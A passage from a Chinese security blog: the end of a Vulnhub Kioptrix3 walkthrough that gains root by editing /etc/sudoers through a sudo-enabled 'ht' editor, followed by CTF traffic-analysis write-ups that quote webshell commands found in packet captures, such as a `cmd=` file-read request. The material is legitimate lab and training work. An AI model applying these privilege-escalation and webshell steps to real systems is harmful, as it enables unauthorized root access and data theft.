<p><em>直接ssh，会导致报错，原因大概是对方使用的ssh版本比较低，详情请看<a class="link" href="https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss">SSH 返回：未找到匹配的主机密钥类型。他们的报价：ssh-dss - 询问 Ubuntu (askubuntu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p>
<h4 id="简单查看两个用户的权限"><a href="#简单查看两个用户的权限" class="headerlink" title="简单查看两个用户的权限"></a>简单查看两个用户的权限</h4><ul>
<li><code>sudo -l</code> 查看当前用户有哪些被sudo服务授权的命令，<strong>可以发现loneferret下ht和su</strong></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240229202721535.png" alt="image-20240229202721535"></p>
<p><em>按理说，我们直接<code>sudo su root</code>就可以直接切换成root，但是发现su的路径貌似写错了，正确的应该是<code>/bin/su</code></em></p>
<p><img lazyload src="/images/loading.svg" data-src="./Screenshot2024-02-29_21.03.16.png" alt="Screenshot2024-02-29_21.03.16"></p>
<h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><ul>
<li><p>利用内核信息提权</p>
</li>
<li><p>SUID提权：直接利用<code>sudo ht</code>编辑<code>/etc/sudoers</code>文件提权</p>
</li>
</ul>
<h3 id="权限提升-privilege-escalation"><a href="#权限提升-privilege-escalation" class="headerlink" title="权限提升 privilege escalation"></a>权限提升 privilege escalation</h3><h4 id="利用LES工具内核提权"><a href="#利用LES工具内核提权" class="headerlink" title="利用LES工具内核提权"></a>利用LES工具内核提权</h4><blockquote>
<p><a class="link" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>LES 工具旨在帮助检测给定 Linux 内核/基于 Linux 的机器的安全缺陷。</p>
</blockquote>
<ul>
<li>利用les工具，查看系统是否有漏洞</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240229161417872.png" alt="image-20240229161417872"></p>
<ul>
<li><p>先通过<code>uname -a</code>查看系统信息：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU /Linux  </span><br></pre></td></tr></table></figure></div>
</li>
<li><p>在kali中<code>bash ./les.sh --uname &quot;Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux&quot;</code></p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240229162455063.png" alt="image-20240229162455063"></p>
<ul>
<li>发现可以直接用脏牛，但具体没实现出来，因为两个用户都有很多权限限制<ul>
<li>可以利用msf中的后渗透meterpreter上传，<em>但由于oscp限制msf的使用，这里不叙述，感兴趣的可以查看这篇文章的内核提权部分 <a class="link" href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></li>
</ul>
</li>
</ul>
<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><blockquote>
<p>关于SUID提权的介绍与总结：<a class="link" href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li>查看ht是否具有suid，<code>ls -al /usr/local/bin/ht</code>，发现rws，s表示具有suid，果然</li>
<li>直接<code>ht</code>，修改<code>/etc/sudoers</code>，添加<code>/bin/bash</code>或修改su的路径为<code>!/bin/su</code></li>
<li>这里我的kali很奇怪，直接ht里面修改会导致<strong>segmentation fault</strong>，只能通过<code>sudo ht /etc/sudoers</code>，而且得改二进制才行:sweat:，搞了很久🤮。最后直接把lonferret改成了ALL=（ALL）ALL</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240229221121593.png" alt="image-20240229221121593"></p>
<ul>
<li>然后就直接<code>sudo su root</code>，<strong>成功拿到root</strong></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240229221244697.png" alt="image-20240229221244697"></p>
<h2 id="参考列表"><a href="#参考列表" class="headerlink" title="参考列表"></a>参考列表</h2><blockquote>
<p><a class="link" href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<blockquote>
<p><a class="link" href="https://www.cnblogs.com/wsec/p/vulhub0x03.html">0×03 Vulnhub 靶机渗透总结之 KIOPTRIX: LEVEL 1.2 (#3) SQL注入+sudo提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<blockquote>
<p><a class="link" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<blockquote>
<p><a class="link" href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>类OSCP靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF_MISC流量分析做题记录</title>
    <url>/2024/03/06/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>CTF MISC 流量分析做题记录</p>
<blockquote>
<p>从零开始的CTF流量分析做题记录，工具主要是wireshark/tshark。标上难度，给各位CTFer练习流量分析提供一些方向，简单的题目步骤很简略，要看详细的wp可以自行搜索；</p>
<p>内含非纯流量分析，可能有流量分析的外壳但套娃套了各种方向的题目。</p>
</blockquote>
<h2 id="BUUCTF流量分析全记录"><a href="#BUUCTF流量分析全记录" class="headerlink" title="BUUCTF流量分析全记录"></a>BUUCTF流量分析全记录</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><h4 id="0x01-wireshark"><a href="#0x01-wireshark" class="headerlink" title="0x01 wireshark"></a>0x01 wireshark</h4><ul>
<li>简单，wireshark搜索password，直接可以找到</li>
</ul>
<h4 id="0x02-被嗅探的流量"><a href="#0x02-被嗅探的流量" class="headerlink" title="0x02 被嗅探的流量"></a>0x02 被嗅探的流量</h4><ul>
<li>简单，wireshark搜索flag{</li>
</ul>
<img lazyload src="/images/loading.svg" data-src="MISC-流量分析做题记录/image-20240307170807418.png" alt="image-20240307170807418" style="zoom:50%;">

<h4 id="0x03-http流量分析1"><a href="#0x03-http流量分析1" class="headerlink" title="0x03 http流量分析1"></a>0x03 http流量分析1</h4><ul>
<li>简单，直接搜索flag就可以找到</li>
</ul>
<h4 id="0x04-数据包中的线索"><a href="#0x04-数据包中的线索" class="headerlink" title="0x04 数据包中的线索"></a>0x04 数据包中的线索</h4><ul>
<li>简单，搜索http，追踪一下</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240307214852713.png" alt="image-20240307214852713"></p>
<ul>
<li>from base64 cyberchef</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240307214909940.png" alt="image-20240307214909940"></p>
<h4 id="0x05-被偷走的文件"><a href="#0x05-被偷走的文件" class="headerlink" title="0x05 被偷走的文件"></a>0x05 被偷走的文件</h4><ul>
<li>简单，wireshark直接导出flag.rar</li>
<li>Wireshark:file— Export Objects — FTP-data</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240307215844137.png" alt="image-20240307215844137"></p>
<ul>
<li>Flag.rar是加密的，ARCHPR跑出密码<code>5790</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240307215943179.png" alt="image-20240307215943179"></p>
<ul>
<li>flag</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240307220232663.png" alt="image-20240307220232663"></p>
<h4 id="0x06-荷兰数据泄露"><a href="#0x06-荷兰数据泄露" class="headerlink" title="0x06 荷兰数据泄露"></a>0x06 荷兰数据泄露</h4><p><strong>这是一道宽带数据分析题</strong></p>
<ul>
<li>题目描述：flag{宽带用户名}</li>
<li>简单，拿到了需要通过一个工具，把<code>conf.bin</code>转化为conf.xml，在里面可以直接找到<code>username</code></li>
</ul>
<blockquote>
<p>工具： <a class="link" href="https://github.com/jahed/tp-link-config-editor">jahed/tp-link-config-editor: A web interface to edit TP-Link Router Config export files (typically named config.bin). (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h4 id="0x07-NTFS数据流"><a href="#0x07-NTFS数据流" class="headerlink" title="0x07 NTFS数据流"></a>0x07 NTFS数据流</h4><blockquote>
<p><a class="link" href="https://hasegawaazusa.github.io/ntfs-streams-note.html">ntfs 数据流笔记 | 独奏の小屋 (hasegawaazusa.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li>简单，用ntfs数据流读取工具就可以<code>AlternateStreamView</code></li>
<li>注意解压需要在windows环境下，用winrar或者7zip</li>
<li>再把解压后的文件夹丢进工具扫描</li>
</ul>
<blockquote>
<p>看到一篇不错的文章：<a class="link" href="https://www.freebuf.com/articles/terminal/195721.html">Windows ADS在渗透测试中的妙用 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h4 id="0x08-9-4-1-鼠标流量分析-鼠标流量分析"><a href="#0x08-9-4-1-鼠标流量分析-鼠标流量分析" class="headerlink" title="0x08 [9.4.1 鼠标流量分析] 鼠标流量分析"></a>0x08 [9.4.1 鼠标流量分析] 鼠标流量分析</h4><ul>
<li>简单，前提是你需要了解<strong>鼠标流量数据格式，tshark提取数据</strong></li>
<li>拿到数据包里面应该是这样的</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240311233529725.png" alt="image-20240311233529725"></p>
<p><strong>关于鼠标流量数据包info里，<code>GET DESCRIPTOR...</code>以及<code>URB_INTERRUPT in </code>这些分别代表什么数据包，以及这些数据包里的字段代表什么含义请查看：</strong></p>
<blockquote>
<p><a class="link" href="https://blog.csdn.net/HAD_INK/article/details/130153044">USB HID 流量分析详解_usbhid.data分析-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>关于鼠标流量数据(HID Data)格式介绍，以及解密脚本的使用请查看：</strong></p>
<blockquote>
<p><a class="link" href="https://p001water.github.io/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/usb/2022/10/12/CTF%E4%B8%AD%E6%88%91%E7%9A%84USB%E9%94%AE%E7%9B%98%E9%BC%A0%E6%A0%87%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E6%8C%87%E5%8D%97%E5%92%8C%E8%84%9A%E6%9C%AC.html">CTF—CTF中我的USB键盘鼠标流量解密指南和脚本 (p001water.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><em>这里需要提醒一下各位，这个题目抓取的HID Data是8bytes的，但你会在鼠标流量数据格式介绍中看到鼠标流量主要以4bytes为主，但是由于各种原因，你拿到的HID Data可能是4或6bytes的，需要具体问题具体分析，通常来说，里面一定有4个字节是代表鼠标数据格式的</em></p>
<ul>
<li>这道题用的工具是: <a class="link" href="https://github.com/P001water/UsbmiceCracker">P001water/UsbmiceCracker: CTF中常见鼠标流量解密脚本 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，使用前记得先利用tshark把数据提取出来，*<code>usbhid.data</code>可以用来过滤具有<strong>hiddata</strong>的数据包*</li>
</ul>
<p><em>如果自己写的话，一定要注意<strong>matplotlib的正y轴是向下延伸的。</strong>嗯，我在这个问题上浪费了1h。</em></p>
<ul>
<li><code>python3 ./UsbmiceCracker.py -f ~/Desktop/atta\ \(2\).pcapng -e usb.capdata -a LEFT </code>就可以直接看到结果了</li>
</ul>
<img lazyload src="/images/loading.svg" data-src="MISC-流量分析做题记录/image-20240311235541425.png" alt="image-20240311235541425">

<ul>
<li>最后的flag就是<code>flag&#123;Hello&#125;</code></li>
</ul>
<p><em>又是学知识的一天😭，流量分析依然任重道远。</em></p>
<h4 id="0x09-9-4-2-键盘流量分析-键盘流量分析"><a href="#0x09-9-4-2-键盘流量分析-键盘流量分析" class="headerlink" title="0x09 [9.4.2 键盘流量分析]键盘流量分析"></a>0x09 [9.4.2 键盘流量分析]键盘流量分析</h4><ul>
<li>简单，直接利用键盘解密脚本即可：<a class="link" href="https://github.com/FzWjScJ/knm">FzWjScJ/knm: 鼠标键盘流量包取证 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，这个脚本也可以用来解密鼠标流量</li>
<li>键盘数据格式通常为8bytes，具体含义可以查看：</li>
</ul>
<blockquote>
<p><a class="link" href="https://blog.csdn.net/HAD_INK/article/details/130153044">USB HID 流量分析详解_usbhid.data分析-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li><p>脚本使用</p>
<ul>
<li>这个脚本自带数据提取，先利用pca提取到out.txt</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312141039776.png" alt="image-20240312141039776"></p>
<ul>
<li>再从out.txt 解析数据</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312141118236.png" alt="image-20240312141118236"></p>
</li>
<li><p>flag:<code>flag&#123;helloworld!&#125;</code></p>
</li>
</ul>
<h4 id="0x0A-NewStarCTF-2023-公开赛道-流量！鲨鱼！"><a href="#0x0A-NewStarCTF-2023-公开赛道-流量！鲨鱼！" class="headerlink" title="0x0A [NewStarCTF 2023 公开赛道]流量！鲨鱼！"></a>0x0A [NewStarCTF 2023 公开赛道]流量！鲨鱼！</h4><ul>
<li>简单，先过滤一下http包，然后数据包长度从大到小排列一下</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312170552749.png" alt="image-20240312170552749"></p>
<ul>
<li>看到这个长度为820的数据包uri为<code>/1.php?cmd=base64%20/.ffffllllllll11111144444GGGGGG|base64</code>，追踪一下，看到一串数据</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312170832771.png" alt="image-20240312170832771"></p>
<ul>
<li>这段数据拷贝下来，这应该是把原本base64的数据再base64传输的，所以要经过两次base64解码，如果你不知道，可以依赖cyber的magic :smile:，或者凭借敏锐的眼力看出Zmxh(这个是flag经过base64拿到的字符串)</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312171226970.png" alt="image-20240312171226970"></p>
<ul>
<li>flag为<code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></li>
</ul>
<h4 id="0x0B-9-3-3-TLS流量分析-TLS流量分析"><a href="#0x0B-9-3-3-TLS流量分析-TLS流量分析" class="headerlink" title="0x0B [9.3.3 TLS流量分析]TLS流量分析"></a>0x0B [9.3.3 TLS流量分析]TLS流量分析</h4><ul>
<li>简单，了解一下TLS流量分析</li>
<li>先过滤一下http，追踪一下最大的post请求数据包</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312205935477.png" alt="image-20240312205935477"></p>
<p>可以看见很多字段，通过搜索发现这些是tls key.log文件的内容，于是保存为key.log</p>
<ul>
<li>编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;Pre-Master-Secret log filename</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312210154500.png" alt="image-20240312210154500"></p>
<p>在选中区域填写刚刚保存的key.log文件</p>
<ul>
<li>导入后，过滤http，发现多了几个包，可以直接搜索flag，<em>直觉与经验告诉我，先查看/Login，果然😄</em></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312210358856.png" alt="image-20240312210358856"></p>
<ul>
<li>flag为<code>flag&#123;e3364403651e775bfb9b3ffa06b69994&#125;</code></li>
</ul>
<h4 id="0x0C-大流量分析（一）"><a href="#0x0C-大流量分析（一）" class="headerlink" title="0x0C 大流量分析（一）"></a>0x0C 大流量分析（一）</h4><ul>
<li>简单，flag是攻击ip，利用wireshark的统计功能即可，大多是sourceip是172开头，b类的内网ip，找统计里，次数比较多的外网ip，很容易找到<code>183.129.152.140</code></li>
</ul>
<h4 id="0x0D-大流量分析（二）"><a href="#0x0D-大流量分析（二）" class="headerlink" title="0x0D 大流量分析（二）"></a>0x0D 大流量分析（二）</h4><ul>
<li>简单，flag是发送钓鱼邮件的邮箱地址，在时间最早的数据包中过滤<code>smtp</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240313112441291.png" alt="image-20240313112441291"></p>
<p>已经可以看到几个邮箱了，直觉和经验告诉我应该是<code>xsser@live.cn </code>，嗯确实是</p>
<ul>
<li>追踪一下<code>xsser@live.cn</code>相关tcp流，发现这样一段消息：</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240313112628888.png" alt="image-20240313112628888"></p>
<ul>
<li>一看就是钓鱼邮件啦，所以flag就是<code>flag&#123;xsser@live.cn&#125;</code></li>
</ul>
<h4 id="0x0E-大流量分析（三）"><a href="#0x0E-大流量分析（三）" class="headerlink" title="0x0E 大流量分析（三）"></a>0x0E 大流量分析（三）</h4><ul>
<li>简单，挨个数据包找，后门一般都是.php文件，而且，一般上传了一个木马后会测试phpinfo能不能返回，利用这点写过滤<code>http.request.full_uri  contains &quot;phpinfo()&quot;</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240313114448816.png" alt="image-20240313114448816"></p>
<ul>
<li>找到了<code>admin.bak.php</code>，flag为<code>flag&#123;admin.bak.php&#125;</code></li>
</ul>
<h4 id="0x0F-秘密文件"><a href="#0x0F-秘密文件" class="headerlink" title="0x0F 秘密文件"></a>0x0F 秘密文件</h4><ul>
<li>简单，先过滤一下ftp</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240313165812088.png" alt="image-20240313165812088"></p>
<ul>
<li>看到第一个包的info，像是一段话，追踪一下，直接能看到传输的文件应该是<code>6b0341642a8ddcbeb7eca927dae6d541.rar</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240313165855826.png" alt="image-20240313165855826"></p>
<ul>
<li>遇到这种需要提取文件的问题，可以利用wireshark自带的<code>Export Objects</code>或者直接利用<code>binwalk</code> <code>foremost</code>这类工具提取 文件。这里第一种方法无法提取，采用binwalk。</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240313170459423.png" alt="image-20240313170459423"></p>
<ul>
<li>拿到的rar是加密的，里面有个txt，对于rar来说最常见的就是暴力破解，ARCHPR直接破解得到密码<code>1903</code>，txt里面就是flag：<code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></li>
</ul>
<h4 id="0x10-John-in-the-middle"><a href="#0x10-John-in-the-middle" class="headerlink" title="0x10 John-in-the-middle"></a>0x10 John-in-the-middle</h4><ul>
<li>简单的套娃，流量分析的外壳，实则是个图片隐写</li>
<li>wireshark打开发现了很多png，foremost分出来，依次丢进stegsolve，logo.png直接有flag出来</li>
</ul>
<h4 id="0x11-SUCTF2018-followme"><a href="#0x11-SUCTF2018-followme" class="headerlink" title="0x11 [SUCTF2018] followme"></a>0x11 [SUCTF2018] followme</h4><ul>
<li>简单，过滤http之后，随便看看Post，就看到了flag</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314153648704-0401811.png" alt="image-20240314153648704"></p>
<h4 id="0x12-CFI-CTF-2018-webLogon-capture"><a href="#0x12-CFI-CTF-2018-webLogon-capture" class="headerlink" title="0x12 [CFI-CTF 2018]webLogon capture"></a>0x12 [CFI-CTF 2018]webLogon capture</h4><ul>
<li>简单，urldecode</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314185839330.png" alt="image-20240314185839330"></p>
<p>urldecode:<code>CFI&#123;1ns3cur3_l0g0n&#125;</code></p>
<p>Flag:<code>flag&#123;1ns3cur3_l0g0n&#125;</code></p>
<h4 id="0x13-greatescape"><a href="#0x13-greatescape" class="headerlink" title="0x13 greatescape"></a>0x13 greatescape</h4><ul>
<li>简单，看到ftp-data，先export objects-&gt;ftp-data，发现有个ssc.key，正好有很多tls数据包</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314214100048.png" alt="image-20240314214100048"></p>
<ul>
<li>把ssc.key存下来，放进设置tls协议的rsalists里面，然后直接可以看到多出来的http数据包，按照大小排序一下，优先查看更大的数据包，依次追踪一下，很容易在头里面发现一个flag：<code>INS&#123;OkThatWasWay2Easy&#125;</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314214242854.png" alt="image-20240314214242854"></p>
<ul>
<li>flag : <code>flag&#123;OkThatWasWay2Easy&#125;</code></li>
</ul>
<h4 id="0x14-INSHack2017-remote-multimedia-controller"><a href="#0x14-INSHack2017-remote-multimedia-controller" class="headerlink" title="0x14 [INSHack2017]remote-multimedia-controller"></a>0x14 [INSHack2017]remote-multimedia-controller</h4><ul>
<li>简单，追踪几个tcp流，追踪到eq 2，能看见可疑数据</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315210800831.png" alt="image-20240315210800831"></p>
<ul>
<li><code>basecrack</code> magic一把嗦：<code>python3 basecrack.py -m</code>然后输入这串数据</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315210922193.png" alt="image-20240315210922193"></p>
<h4 id="0x15-NewStarCTF-公开赛赛道-Whats-HTTP"><a href="#0x15-NewStarCTF-公开赛赛道-Whats-HTTP" class="headerlink" title="0x15 [NewStarCTF 公开赛赛道]Whats HTTP"></a>0x15 [NewStarCTF 公开赛赛道]Whats HTTP</h4><ul>
<li>简单，通过几个返回200的http，追踪一下流，发现</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318150243796.png" alt="image-20240318150243796"></p>
<ul>
<li>复制下来，丢给cyberchef，拿到flag：<code>flag&#123;4f33649d030c6778426971b54dd72ece&#125;</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318150257750.png" alt="image-20240318150257750"></p>
<h4 id="0x16-Dest0g3-520迎新赛-StrangeTraffic"><a href="#0x16-Dest0g3-520迎新赛-StrangeTraffic" class="headerlink" title="0x16 [Dest0g3 520迎新赛]StrangeTraffic"></a>0x16 [Dest0g3 520迎新赛]StrangeTraffic</h4><ul>
<li>简单</li>
<li>简单了解一下：Modbus由MODICON公司于1979年开发，是一种工业现场总线协议标准。1996年施耐德公司推出基于以太网TCP/IP的Modbus协议，ModbusTCP。</li>
<li>追踪TCP流，每四条变换一个字母</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318202756804.png" alt="image-20240318202756804"></p>
<p>组合一下：RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9</p>
<p>拿去base64得到flag:<code>Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;</code></p>
<h4 id="0x17-DASCTF八月挑战赛-stealer"><a href="#0x17-DASCTF八月挑战赛-stealer" class="headerlink" title="0x17 [DASCTF八月挑战赛]stealer"></a>0x17 [DASCTF八月挑战赛]stealer</h4><ul>
<li>简单的DNS流量分析，恶心在最后的flag只交里面的md5</li>
<li>感觉DNS经常往queries的name里面写东西，先过滤一下dns，然后发现了开头为<code>iVBORW</code>，这是PNG头的base64，再过滤一下<code>dns.flags==0x8180</code>，意思是只过滤dns responses，如果是<code>dns.flags==0x0100</code>则是只过滤requests</li>
<li>tshark 提取一下</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;stealer.pcapng&quot; -Y &#x27;dns.flags == 0x8180&#x27; -T fields -e &quot;dns.qry.name&quot;|sed &#x27;s/.ctf.com.cn$//g&#x27;|sed &#x27;s/*/+/g&#x27; &gt;stealer.txt</span><br></pre></td></tr></table></figure></div>

<p>手动删除开头和结尾多余的字符串，*<em>再把</em>变成+**（这个地方不是很好想）</p>
<ul>
<li>丢进cyberchef</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240319152108775.png" alt="image-20240319152108775"></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240319152116786.png" alt="image-20240319152116786"></p>
<ul>
<li>flag只交md5，所以没有o和l</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1d3f729ac02bbc15f00adccd79207ab0</span><br></pre></td></tr></table></figure></div>

<h4 id="0x18-2022DASCTF-Apr-X-FATE-防疫挑战赛-SimpleFlow"><a href="#0x18-2022DASCTF-Apr-X-FATE-防疫挑战赛-SimpleFlow" class="headerlink" title="0x18 [2022DASCTF Apr X FATE 防疫挑战赛]SimpleFlow"></a>0x18 [2022DASCTF Apr X FATE 防疫挑战赛]SimpleFlow</h4><ul>
<li><p>简单的webshell蚁剑流量分析</p>
</li>
<li><p>tcp追踪流</p>
</li>
</ul>
<p>eq 42: <code>head -n 2 ../flag.txt</code> 输出了flag.txt的前两行</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240319171814366.png" alt="image-20240319171814366"></p>
<p>eq 50: 这一串解出来是下面这一串，发现了zip的密码<code>PaSsZiPWorD</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd &quot;/Users/chang/Sites/test&quot;;zip -P PaSsZiPWorD flag.zip ../flag.txt;echo [S];pwd;echo [E]</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./image-20240319171956472.png" alt="image-20240319171956472"></p>
<p>eq 51: 发现了目录下有flag.zip，zip里面想必就是flag.txt，把flag.zip提取出来，可以使用foremost直接分离，或者继续追踪流找zip</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240319171832197.png" alt="image-20240319171832197"></p>
<p>  eq 52：成功发现PK字段，提取出来，拿到压缩包</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240319172147932.png" alt="image-20240319172147932"></p>
<ul>
<li>压缩包是加密的，用我们得到的密码解密，即可得到flag:<code>DASCTF&#123;f3f32f434eddbc6e6b5043373af95ae8&#125;</code></li>
</ul>
<h4 id="0x19-NewStarCTF-2023-公开赛道-Nmap"><a href="#0x19-NewStarCTF-2023-公开赛道-Nmap" class="headerlink" title="0x19 [NewStarCTF 2023 公开赛道]Nmap"></a>0x19 [NewStarCTF 2023 公开赛道]Nmap</h4><ul>
<li>简单，第一次接触nmap流量分析，flag为开放的端口（用英文逗号隔开从小到大）</li>
<li>需要知道nmap几种扫描方式会怎样发包，找到题目的扫描方式，再对应分析端口开放的回复包</li>
</ul>
<blockquote>
<p><a class="link" href="https://blog.csdn.net/m0_43406494/article/details/109091389">nmap流量分析_nmap流量特征-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>]</p>
</blockquote>
<ul>
<li>根据上面的网址，对应**-sS<strong>扫描模式，因为可以看见大量SYN包且目标端口有很多个，-sS模式下，回复包为</strong>SYN/ACK证明端口开放，RST包则说明端口关闭，ICMP不可达报文或者没有回复则说明端口被防火墙屏蔽了**</li>
<li>SYN,ACK的flags值为0x012，过滤一下，因为是回复包，只要注意源端口即可，发现有这几个端口，所以flag为<code>flag&#123;80,3306,5000,7000,8021,9000&#125;</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240320214047143.png" alt="image-20240320214047143"></p>
<h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><h4 id="0x01-9-3-2-webshell混淆流量分析-webshell流量分析1"><a href="#0x01-9-3-2-webshell混淆流量分析-webshell流量分析1" class="headerlink" title="0x01 [9.3.2 webshell混淆流量分析]webshell流量分析1"></a>0x01 [9.3.2 webshell混淆流量分析]webshell流量分析1</h4><ul>
<li>中等，菜刀</li>
<li>设置筛选条件<code>http</code>，先看看http的数据包都有些啥，然后看到了有些是<code>/upload/1.php</code>，应该是上传了什么东西，追踪一下http流</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240310155921443.png" alt="image-20240310155921443"></p>
<p>可以看到里面传了一个z1 base64为<code>RDpcd2FtcDY0XHd3d1x1cGxvYWQ=</code>，cyberchef拿到解码后结果<code>D:\wamp64\www\upload</code>，所以z1应该是上传的路径的参数</p>
<ul>
<li><p>我们可以找找他上传了什么东西，先通过<code>http.request.uri contains &#39;/upload/1.php&#39;</code>筛选数据包，把数据包的length从大到小排列一下。<em>length长的想必信息一定是最多的吧！</em></p>
</li>
<li><p>果然我们在第一条里看到了不一样的东西，首先此包有个z1参数，解码后为<code>D:\wamp64\www\upload\6666.jpg</code>，看来上传了一个jpg，此外，还有一个新的参数z2，from hex后发现应该就是6666.jpg，里面有一行像password的，先留着<code>Th1s_1s_p4sswd_!!!</code></p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240310162626338.png" alt="image-20240310162626338"></p>
<ul>
